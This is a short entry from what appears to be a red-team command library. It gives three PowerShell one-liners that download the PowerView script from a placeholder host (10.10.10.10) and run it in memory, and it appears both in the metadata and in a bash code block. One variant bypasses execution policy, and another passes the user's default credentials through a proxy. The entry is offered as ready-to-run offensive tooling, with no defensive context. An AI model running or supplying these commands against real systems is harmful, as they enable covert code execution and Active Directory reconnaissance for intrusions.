---
id: e2f9b07e-54dc-4223-bcf9-51690dabfc22
name: Download and execute PowerView (Proxy-Aware)
type: command
executor: bash
data: 'IEX (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/PowerView.ps1'')

  echo IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.10/PowerView.ps1'')
  | powershell -noprofile -

  powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(''http://10.10.10.10/PowerView.ps1'')|iex"'
output: null
created_at: '2023-04-06T03:56:24.056006+00:00'
updated_at: '2023-04-10T20:37:01.110401+00:00'
---

# Download and execute PowerView (Proxy-Aware)

```bash
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"
```


